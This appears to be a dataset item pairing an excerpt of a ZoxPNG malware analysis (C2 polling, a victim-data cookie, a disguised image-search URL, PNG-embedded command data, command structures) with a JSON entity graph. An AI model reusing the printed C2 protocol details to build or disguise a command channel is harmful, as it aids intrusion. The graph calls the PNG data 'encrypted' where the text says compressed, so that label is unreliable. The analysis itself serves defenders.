@@ -1,0 +1,301 @@
+
+
+
+Sentence : Communication and Command Dispatch
+When ZoxPNG enters the communication loop, the Trojan sends a request to the C2 server in
+the form of a HTTP GET request. The first GET request provides the initial dial-home to the C2
+server and results in the C2 server sending the first command to the ZoxPNG binary via a
+special PNG file attached to the response. Subsequent requests from the ZoxPNG binary can
+come in the form of a GET request if the response to the C2 server’s command does not require
+any data or acknowledgement, or a POST request with a PNG upload containing data to be
+sent to the C2 server. For each request to the C2 server that the ZoxPNG binary generates, the
+C2 server will respond with a valid HTTP response that includes a PNG file containing the next
+instruction for the binary to execute. Figure 1 provides a graphical representation of the polling
+model that the ZoxPNG binary employs when communicating with the C2 server.
+ZoxPNG
+Binary
+ZoxPNG
+C2 
+ Server
+The ZoxPNG is surprisingly
+accommodating to network instability.
+For each polling request to the C2
+server, the ZoxPNG binary will attempt
+to contact the C2 server up to five times
+before failing. Between attempts, the
+ZoxPNG binary will wait 5 seconds.
+Coupling the 5 second interval waits
+with the fact that the default timeout
+using InternetOpen is 30 seconds, a
+ZoxPNG binary could wait up to 175
+seconds (nearly 3 minutes) for a C2
+server to come online before terminating
+the session.
+The communication subsystem of
+ZoxPNG uses the WinInet API. While
+this has the advantage of offloading the
+HTTP processing, it also has the
+advantage of allowing ZoxPNG to
+automatically use any proxy settings
+currently configured on the victim’s
+machine. ZoxPNG uses the
+InternetOpen, InternetConnect
+Figure 1: Communication Pattern between ZoxPNG and its C2
+Server and HttpOpenRequest APIs to begin a
+HTTP connection to the C2 server. As
+mentioned previously, if the ZoxPNG binary is sending data to the C2 server,
+HttpOpenRequest is given the POST verb otherwise it uses the GET verb. Prior to using any of
+the WinInet APIs, however, ZoxPNG generates a small data structure of 52 bytes that contains
+information about the victim’s machine. The data structure in Figure 2 defines the
+VictimSystemData data structure.
+```
+pragma pack(push, 1)
+struct VictimSystemData
+{
+char fIs64BitProcess;
+   char field_1;  // binary result of an obscure test
+   char bOSMajorVersion;
+   char bOSMinorVersion;
+   DWORD dwActiveCodePage;
+   DWORD dwRandomValue;
+DWORD dwMegsOfMemory;
+   DWORD dwPID;
+char szComputerName[32];
+};
+pragma pack(pop)
+```
+Figure 2: VictimSystemData Structure
+It is unclear why the developer(s) of ZoxPNG decided that it was necessary to generate the data
+structure at each and every attempt to contact the C2 server instead of generating the static
+data once and using a cached copy. Nevertheless, the ZoxPNG binary will generate the data
+each time prior to activating the WinInet APIs. The ZoxPNG binary will transmit the data to the
+C2 server via the HTTP header Cookie as part of the SESSIONID value. In order to transfer
+the data without running into NULL byte issues, the VictimSystemData structure is
+transformed using a standard Base64 encoding.
+There are two interesting pieces to the VictimSystemData. The first interesting piece is the
+dwRandomValue field. While the field does appear to be the generation of calls to the rand
+function, in actuality it is a checksum of the victim’s computer name. The ZoxPNG binary will
+loop through the NULL terminated string of the victim’s computer name in four byte increments
+in order to generate a 32-bit value, use the 32-bit value as the seed value to srand, and then
+multiply an accumulator by the value of the next rand call. This convoluted checksum appears
+to have no other purpose than to provide a means to detect corrupt or forged requests as they
+relate only to the computer’s name. After going through a maximum of 30 cycles (leading to the
+possibility that random data may be introduced given that the computer name buffer is only 32
+bytes long), the value of dwRandomValue is truncated to 1,000,000 by virtue of a modulus
+operation. Figure 3 provides the pseudo-code for the dwRandomValue generation.
+```
+GetComputerNameA(&Buffer, &nSize);
+v6 = (unsigned int *)&Buffer
+victimSysData->dwRandomValue = 1;
+i = 1;
+do
+{
+if ( !*v6 )
+break;
+srand(*v6);
+++i;
+++v6;
+victimSysData->dwRandomValue *= rand();
+}
+while ( i < 30 );
+victimSysData->dwRandomValue %= 1000000u;
+```
+Figure 3: dwRandomValue Generation in Psuedo-C
+With the VictimSystemData structure generated and an Internet session handle opened,
+ZoxPNG calls HttpOpenRequest with the appropriate verb to open a specific URL to the C2
+server. The URL that the ZoxPNG binary will request is largely static and takes the form of a
+complex image request. The request to the C2 server takes the following form:
+http:// {C2 Address} /imgres?q=A380&hl=en-
+US&sa=X&biw=1440&bih=809&tbm=isus&tbnid=aLW4
+J8Q1lmYBM:&imgrefurl=http:// {C2Address} &docid=1bi0Ti1ZVr4bEM&imgurl=http
+
+:// {C2 Address} / {4 digit year} {2 digit month} / {4 digit year}{2 digit month}{2 digit day}{2 digit
+hour}{2 digit minute}{2 digit
+second} .png&w=800&h=600&ei=CnJcUcSBL4rFkQX444HYCw&zoom=1&ved=1t:3588,r:
+```
+1,s:0,i:92&iact=rc&dur=368&page=1&tbnh=184&tbnw=259&start=0&ndsp=20&tx
+=114&ty=58
+```
+After opening a HTTP request to the URL, the ZoxPNG will add a User-Agent header based on
+the user-agent string returned by a call to the ObtainUserAgentString API function. If that
+function fails to return a user-agent, then ZoxPNG will default to the following user-agent string:
+```
+Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0;
+SLCC2; .NETCLR 2.0.50727)
+```
+The ZoxPNG binary will also append Pragma, Accept-Language and Accept-Encoding
+headers before concluding with a Connection: Close header. The result is a request that
+takes the form of:
+```
+GET /imgres?q=A380&hl=en-US&sa=X&biw=1440&bih=809&tbm=isus&tbnid=aLW4J8Q1lmYBM:&imgrefurl=http://127.0.0.1&docid=1bi0Ti1ZVr4bEM&imgurl=http
+://127.0.0.1/201410/20141020021012.png&w=800&h=600&ei=CnJcUcSBL4rFkQX444HYCw&zoom=1&ved
+=1t:3588,r:1,s:0,i:92&iact=rc&dur=368&page=1&tbnh=184&tbnw=259&start=0
+&ndsp=20&tx=114&ty=58 HTTP/1.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, /
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1;
+Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR
+3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C)
+Pragma: no-cache
+Accept-Language: en-US
+Accept-Encoding: gzip, deflate
+Connection: Close
+Cookie:
+SESSIONID=AAAFAeQEAAAEZgcAYggAAMAFAABJMjY4ODU2LTM3NUMzMTcAAAAAAAAAAAAA
+AAAAAAAAAA==
+Host: 127.0.0.1
+```
+ZoxPNG transmits data via a specifically constructed PNG file. The format of the PNG file that
+carries data to and from the C2 server is relatively straight forward. For data coming from the C2
+server, the PNG file must start with the following bytes in order: 0x89, 0x50, 0x4E, 0x47,
+0x0D, 0x0A, 0x1A, 0x0A . The DWORD starting at offset 0x21 contains the size of the data
+within the PNG file while the data begins at offset 0x29. The DWORD at 0x21 is in big-endian
+format. The data at offset 0x29 is compressed using the zlib deflate (version 1.1.4) system.
+Novetta was unable to observe a live sample of the PNG file originating from the C2 but it is
+reasonable to believe that the overall format of the PNG file is the same as the format as the
+PNG file that the ZoxPNG binary sends to the C2 server as the important offsets of 0x21 (33)
+and 0x29 (41) are identical.
+The format of the PNG file originating at the ZoxPNG binary is defined, which could be
+potentially leveraged by IDS. The following table defines the known values of the PNG file
+(regardless of the data appended):
+|Offset Known Values Notes|Col2|Col3|
+|---|---|---|
+|0 (8 bytes)|0x89 0x50 0x4E 0x47 0x0D 0x0A0x1A 0x0A|PNG header|
+|8 (4 bytes)|0x00 0x00 0x00 0x0D|Length of image headerchunk|
+|12 (4 bytes)|‘IHDR’|Image header tag|
+|16 (13 bytes)|0x00 0x00 0x00 0xC8 0x00 0x000x00 0x64 0x08 0x00 0x00 0x000x00|Specifies 200x100px 8-bitimage|
+|29 (4 bytes)|0xE6 0xED 0x20 0xD7|CRC32 value of IHDR chunk|
+|33 (4 bytes)|variable|Size of IDAT (embeddeddata) chunk|
+|37 (4 bytes)|‘IDAT’|Data header tag|
+|41 (n bytes)|variable|Embedded data of n bytes|
+|41+n (4 bytes)|variable|CRC32 value of IDAT chunk|
+|45+n (4 bytes)|0x00 0x00 0x00 0x00|Length of IEND chunk|
+|49+n (4 bytes)|‘IEND’|Image end tag|
+|53+n (4 bytes)|0xAE 0x42 0x60 0x82|CRC32 value of IEND chunk|
+Note that the embedded data within the IDAT tag is compressed using the deflate function. In
+order to restore the IDAT data, both sides of the conversation will use the zlib inflate
+functionality.
+The PNG file adheres to the PNG standard thereby making it less detectible to heuristic
+sensors. However, by inspection of the IDAT ’s size, it could be possible to determine that the
+image is not 200x100 bytes (20000 bytes) and therefore the IDAT section is not the proper size
+for the specific image size.
+After the PNG image is received by the ZoxPNG binary, the binary will extract the contents of
+the IDAT section, recover the original data blob, and send the data to the command dispatch.
+Each data blob that comes from a PNG file contains a header that allows the command dispatch
+system to quickly route the data blob to the appropriate handler. At the outer most layer of the
+structure is the CommandHeader which contains two fields: dwCommandDataSize and
+command. dwCommandDataSize is the overall size of the data blob including the
+CommandHeader component while the command field is a CommandData structure containing
+the information necessary to route the command (and its data) to the appropriate data handler.
+Figure 4 defines both the CommandHeader and CommandData structures.
+The CommandData structure contains four fields of which the most important is the
+dwCommandID field. The dwCommandID field defines the purpose of the data (if any) that
+follows the CommandData (and by extension, the CommandHeader ) structure in the data blob.
+The dwCommandID value corresponds to one of the registered command handler ID values
+(starting at 0x80061001). If a specific command requires additional arguments then the
+dwPayloadSize field will be greater than 0. The dwPayloadSize field specifies the number
+of bytes following the CommandData structure. The dwCommandSequenceID and
+dwLastError fields are largely ignored by the various commands.
+```
+struct CommandHeader
+{
+DWORD dwCommandDataSize;
+CommandData command;
+};
+struct CommandData
+{
+DWORD dwCommandID;
+DWORD dwCommandSequenceID;
+DWORD dwLastError;
+DWORD dwPayloadSize;
+};
+```
+Figure 4: CommandHeader and CommandData Structure Definitions
+Whenever a command sends any data back to the C2 server, the same CommandHeader and
+CommandData fields are prepended to the data blob coming from the various commands. In the
+case where data is going back to the C2 server, it is possible that the dwLastError field may
+be set to a non-zero value indicating the status of a particular command (the field is commonly
+set to the value returned by the function GetLastError ). The dwCommandSequenceID
+number field is set to the same value as the command whenever the ZoxPNG binary sends data
+to the C2 server.
+The data that follows a CommandData field is specific to each command. The command
+dispatch is ignorant of any data that follows beyond the CommandHeader and CommandData .
+The commands themselves are ignorant of the CommandHeader as only the CommandData is
+sent to the individual command handlers.
+Output : 
+{
+  "nodes": [
+    {
+      "id": "1",
+      "type": "C2 Server",
+      "label": "Command and Control (C2) Server"
+    },
+    {
+      "id": "2",
+      "type": "ZoxPNG Binary",
+      "label": "ZoxPNG Malware Binary"
+    },
+    {
+      "id": "3",
+      "type": "HTTP Request",
+      "label": "HTTP GET Request to C2 Server"
+    },
+    {
+      "id": "4",
+      "type": "PNG File",
+      "label": "Encrypted PNG File (Data Blob)"
+    },
+    {
+      "id": "5",
+      "type": "Command Dispatch",
+      "label": "Command Dispatch System"
+    },
+    {
+      "id": "6",
+      "type": "CommandHeader",
+      "label": "CommandHeader Structure"
+    },
+    {
+      "id": "7",
+      "type": "CommandData",
+      "label": "CommandData Structure"
+    }
+  ],
+  "edges": [
+    {
+      "from": "2",
+      "to": "1",
+      "label": "Sends HTTP GET Request with User-Agent and Headers",
+      "arrows": "to"
+    },
+    {
+      "from": "1",
+      "to": "2",
+      "label": "Responds with Encrypted PNG File (Data Blob)",
+      "arrows": "to"
+    },
+    {
+      "from": "2",
+      "to": "5",
+      "label": "Parses and Extracts Data from PNG File",
+      "arrows": "to"
+    },
+    {
+      "from": "5",
+      "to": "6",
+      "label": "Uses CommandHeader to Route Commands",
+      "arrows": "to"
+    },
+    {
+      "from": "6",
+      "to": "7",
+      "label": "Contains CommandData for Specific Commands",
+      "arrows": "to"
+    },
+    {
+      "from": "2",
+      "to": "1",
+      "label": "Sends Data Back to C2 Server with CommandHeader and CommandData",
+      "arrows": "to"
+    }
+  ]
+}
